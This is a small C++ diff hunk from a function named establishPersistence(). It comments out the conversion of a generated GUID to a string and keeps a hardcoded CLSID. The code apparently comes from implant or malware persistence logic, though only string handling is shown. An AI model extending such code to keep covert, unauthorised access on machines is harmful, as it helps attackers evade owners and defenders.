@@ -86,8 +86,8 @@ void establishPersistence() {
         std::wstring clsid_w(guid_w);
 
         int clsid_size_needed = WideCharToMultiByte(CP_UTF8, 0, &clsid_w[0], (int)clsid_w.size(), NULL, 0, NULL, NULL);
-        std::string clsid(clsid_size_needed, 0);
-        WideCharToMultiByte(CP_UTF8, 0, &clsid_w[0], (int)clsid_w.size(), &clsid[0], clsid_size_needed, NULL, NULL);
+        //std::string clsid(clsid_size_needed, 0);
+        //WideCharToMultiByte(CP_UTF8, 0, &clsid_w[0], (int)clsid_w.size(), &clsid[0], clsid_size_needed, NULL, NULL);
 
 
         std::string clsid = "{54E211B6-3650-4F75-8334-FA359598E1C5}"; //default CLSID || remove this line for random clsid
